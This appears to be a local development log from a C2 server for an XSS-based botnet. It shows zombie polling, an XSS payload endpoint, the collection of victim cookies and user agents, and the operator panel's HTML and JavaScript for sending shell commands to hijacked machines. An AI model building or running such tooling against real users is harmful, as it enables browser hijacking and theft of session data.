2025-06-25 00:09:45 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:45] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:46 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:46 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:46 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:46 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:46] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:48 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:48 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:48 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:48 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:48] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:50 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:50 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:50 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:50 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:50] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:52 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:52 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:52 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:52 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:52] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:54 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:54 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:54 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:54 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:54] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:56 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:56 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:56 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:56 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:56] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:09:58 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:09:58 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:09:58 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:09:58 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:09:58] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:00 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:00 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:00 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:00 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:00] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:02 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:02 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:02 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:02 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:02] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:04 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:04 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:04 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:04 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:04] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:06 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:06 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:06 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:06 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:06] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:08 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:08 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:08 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0013s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:08 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:08] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:10 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:10 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:10 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:10 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:10] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:12 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:12 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:12 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:12 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:12] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:14 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:14 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:14 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:14 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:14] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:16 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:16 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:16 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:16 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:16] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:18 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:18 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:18 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:18 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:18] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:19 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:19 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:19 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:19 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:19] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:20 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:20] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 xss_payload()
2025-06-25 00:10:20 | INFO     | control_route.py:135 | xss_payload() | 用戶請求XSS載荷文件
2025-06-25 00:10:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] xss_payload 執行完畢 (耗時: 0.0003s) -> 回傳: <Response 2102 bytes [200 OK]>
2025-06-25 00:10:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:20] "GET /api/control/xss_payload HTTP/1.1" 200 -
2025-06-25 00:10:20 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 add_message()
2025-06-25 00:10:20 | INFO     | control_route.py:28 | add_message() | 用戶請求添加消息 (POST)
2025-06-25 00:10:20 | ERROR    | control_route.py:68 | add_message() | 添加消息時發生錯誤: (sqlite3.IntegrityError) UNIQUE constraint failed: web_shell_back_point.target_ip
[SQL: INSERT INTO web_shell_back_point (target_ip, target_config, "where", created_at, to_do_command) VALUES (?, ?, ?, ?, ?)]
[parameters: ('127.0.0.1', '{"where":"http://127.0.0.1:8000/","target_ip":"127.0.0.1","cookie":"","user_agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36","time_stamp":"2025-06-24T16:10:20.193Z"}', None, '2025-06-25 00:10:20.197754', None)]
(Background on this error at: https://sqlalche.me/e/20/gkpj)
2025-06-25 00:10:20 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] add_message 執行完畢 (耗時: 0.0017s) -> 回傳: <Response 237 bytes [302 FOUND]>
2025-06-25 00:10:20 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:20] "[32mPOST /api/control/add_message HTTP/1.1[0m" 302 -
2025-06-25 00:10:21 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:21 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:21 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:21 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:21] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:22 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:22 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:22 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:22 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:22] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:23 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:23 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:23 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0011s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:23 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:23] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:24 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:24 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:24 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:24 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:24] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:25 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:25 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:25 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:25 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:25] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:26 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:26 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:26 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:26 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:26] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:27 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:27 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:27 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:27 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:27] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:28 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:28 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:28 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:28 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:28] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:29 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:29 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:29 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0010s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:29 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:29] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:30 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:30 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:30 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0007s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:30 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:30] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:31 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:31 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:31 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:31 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:31] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:32 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:32 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:32 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0006s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:32 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:32] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:33 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:33 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:33 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0008s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:33 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:33] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:34 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:34 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:34 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:34 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:34] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:35 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:35 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:35 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0009s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:35] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:35] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:10:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:35] "[36mGET /static/css/control_message.css HTTP/1.1[0m" 304 -
2025-06-25 00:10:35 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:35] "[33mGET /.well-known/appspecific/com.chrome.devtools.json HTTP/1.1[0m" 404 -
2025-06-25 00:10:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_command()
2025-06-25 00:10:36 | INFO     | control_route.py:164 | get_command() | 肉雞請求獲取命令
2025-06-25 00:10:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_command 執行完畢 (耗時: 0.0014s) -> 回傳: <Response 41 bytes [200 OK]>
2025-06-25 00:10:36 | INFO     | _internal.py:97 | _log() | 127.0.0.1 - - [25/Jun/2025 00:10:36] "GET /api/control/get_command?zombie_ip=127.0.0.1 HTTP/1.1" 200 -
2025-06-25 00:10:36 | INFO     | config.py:289 | sync_wrapper() | 📞 [開始] 調用 get_messages()
2025-06-25 00:10:36 | INFO     | control_route.py:81 | get_messages() | 用戶請求獲取消息
2025-06-25 00:10:36 | INFO     | config.py:294 | sync_wrapper() | ✅ [成功] get_messages 執行完畢 (耗時: 0.0077s) -> 回傳: '<!DOCTYPE html>\n<html lang="zh-TW">\n    \n    <head>\n        <meta charset="UTF-8">\n        <meta name="viewport" content="width=device-width, initial-scale=1.0">\n        <title>控制消息</title>\n        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.2.3/dist/css/bootstrap.min.css">\n        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">\n        \n    </head>\n    <body>\n        <!-- 导航栏 -->\n        <nav class="navbar navbar-expand-lg navbar-dark bg-primary">\n            <div class="container">\n                <a class="navbar-brand" href="/">\n                    <i class="fas fa-shield-alt"></i> 扫描目标管理系统\n                </a>\n                <button class="navbar-toggler" type="button" data-bs-toggle="collapse" data-bs-target="#navbarNav">\n                    <span class="navbar-toggler-icon"></span>\n                </button>\n                <div class="collapse navbar-collapse" id="navbarNav">\n                    <ul class="navbar-nav ms-auto">\n                        <li class="nav-item">\n                            <a class="nav-link" href="/">\n                                <i class="fas fa-home"></i> 目标列表\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/add_target">\n                                <i class="fas fa-plus"></i> 添加目标\n                            </a>\n                        </li>\n                        <li class="nav-item">\n                            <a class="nav-link" href="/api/control/get_messages">\n                                <i class="fas fa-cog"></i> 控制消息\n                            </a>\n                        </li>\n                    </ul>\n                </div>\n            </div>\n        </nav>\n\n        \n        \n        \n\n        \n<div class="container">\n    <!-- Flash 消息區域 -->\n    \n    \n    \n\n    <!-- 選項卡導航 -->\n    <div class="tab-navigation">\n        <button class="tab-btn active" onclick="showTab(\'messages\')">📨 控制消息</button>\n        <button class="tab-btn" onclick="showTab(\'zombies\')">🧟 殭屍管理</button>\n    </div>\n\n    <!-- 控制消息選項卡 -->\n    <div id="messages-tab" class="tab-content active">\n        <h2>控制消息</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">透過此面板管理和監控您的C2控制消息</p>\n        <form method="post" action="/api/control/add_message">\n            <div class="form-group">\n                <label class="form-label" for="message">控制消息</label>\n                <input type="text" id="message" name="message" placeholder="輸入要發送的控制消息" required>\n            </div>\n            <div class="form-group">\n                <label class="form-label" for="target_ip">目標IP地址</label>\n                <input type="text" id="target_ip" name="target_ip" placeholder="輸入目標IP地址（可選）">\n            </div>\n            <button type="submit">發送消息</button>\n        </form>\n    </div>\n\n    <!-- 殭屍管理選項卡 -->\n    <div id="zombies-tab" class="tab-content">\n        <h2>殭屍機器管理</h2>\n        <p style="text-align: center; color: #6c757d; font-style: italic;">管理已連接的殭屍機器並發送命令</p>\n\n        <!-- 殭屍機器列表 -->\n        <div class="zombie-controls">\n            <button id="refresh-zombies" class="refresh-btn">🔄 刷新殭屍列表</button>\n            <div id="zombie-count" class="zombie-count">載入中...</div>\n        </div>\n\n        <div id="zombie-list" class="zombie-list">\n            <!-- 殭屍機器將通過JavaScript動態載入 -->\n        </div>\n\n        <!-- 命令發送表單 -->\n        <div class="command-form-container" style="display: none;" id="command-form-container">\n            <h3>發送命令給殭屍機器</h3>\n            <form id="command-form">\n                <div class="form-group">\n                    <label class="form-label" for="selected-zombie">選中的殭屍機器</label>\n                    <input type="text" id="selected-zombie" readonly>\n                </div>\n                <div class="form-group">\n                    <label class="form-label" for="command">執行命令</label>\n                    <input type="text" id="command" name="command" placeholder="輸入要執行的命令" required>\n                </div>\n                <div class="form-group">\n                    <label class="form-label">常用命令</label>\n                    <div class="quick-commands">\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'whoami\')">whoami</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'pwd\')">pwd</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ls -la\')">ls -la</button>\n                        <button type="button" class="quick-cmd-btn" onclick="setCommand(\'ps aux\')">ps aux</button>\n                        <button type="button" class="quick-cmd-btn"\n                            onclick="setCommand(\'netstat -tuln\')">netstat</button>\n                    </div>\n                </div>\n                <button type="submit">💀 發送命令</button>\n                <button type="button" onclick="hideCommandForm()">取消</button>\n            </form>\n        </div>\n    </div>\n    <div style="display: flex; justify-content: space-between; align-items: center; margin: 40px 0 20px 0;">\n        <h1 style="margin: 0;">已經知道的消息列表</h1>\n        <a href="/api/control/help" class="help-btn">📚 查看使用說明</a>\n    </div>\n    <div id="messageList">\n        \n        \n        <div class="message">\n            <p><strong>目標IP:</strong> 127.0.0.1</p>\n            <p><strong>目標配置:</strong> {&#34;where&#34;:&#34;http://127.0.0.1:8000/&#34;,&#34;target_ip&#34;:&#34;127.0.0.1&#34;,&#34;cookie&#34;:&#34;&#34;,&#34;user_agent&#34;:&#34;Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36&#34;,&#34;time_stamp&#34;:&#34;2025-06-24T16:09:37.026Z&#34;}</p>\n            <p><strong>建立時間:</strong> 2025-06-25 00:09:37.030762</p>\n        </div>\n        \n        \n    </div>\n</div>\n<link rel="stylesheet" href="/static/css/control_message.css">\n\n<script>\n    // 選項卡切換功能\n    function showTab(tabName) {\n        // 隱藏所有選項卡內容\n        const tabContents = document.querySelectorAll(\'.tab-content\');\n        tabContents.forEach(tab => {\n            tab.classList.remove(\'active\');\n        });\n\n        // 移除所有選項卡按鈕的活動狀態\n        const tabBtns = document.querySelectorAll(\'.tab-btn\');\n        tabBtns.forEach(btn => {\n            btn.classList.remove(\'active\');\n        });\n\n        // 顯示選中的選項卡\n        document.getElementById(tabName + \'-tab\').classList.add(\'active\');\n        event.target.classList.add(\'active\');\n\n        // 如果切換到殭屍管理選項卡，自動載入殭屍列表\n        if (tabName === \'zombies\') {\n            loadZombies();\n        }\n    }\n\n    // 載入殭屍機器列表\n    async function loadZombies() {\n        try {\n            const response = await fetch(\'/api/control/get_zombies\');\n            const data = await response.json();\n\n            const zombieCountEl = document.getElementById(\'zombie-count\');\n            const zombieListEl = document.getElementById(\'zombie-list\');\n\n            if (data.status === \'success\') {\n                zombieCountEl.textContent = `找到 ${data.count} 台殭屍機器`;\n\n                if (data.zombies.length === 0) {\n                    zombieListEl.innerHTML = \'<div class="empty-state">目前沒有連接的殭屍機器</div>\';\n                } else {\n                    let zombieHtml = \'\';\n                    data.zombies.forEach(zombie => {\n                        zombieHtml += `\n                        <div class="zombie-card" onclick="selectZombie(\'${zombie}\')">\n                            <div class="zombie-info">\n                                <h4>🧟 ${zombie}</h4>\n                                <p>點擊選擇此殭屍機器</p>\n                            </div>\n                            <div class="zombie-actions">\n                                <button class="action-btn" onclick="event.stopPropagation(); selectZombie(\'${zombie}\')">\n                                    💀 發送命令\n                                </button>\n                            </div>\n                        </div>\n                    `;\n                    });\n                    zombieListEl.innerHTML = zombieHtml;\n                }\n            } else {\n                zombieCountEl.textContent = \'載入失敗\';\n                zombieListEl.innerHTML = `<div 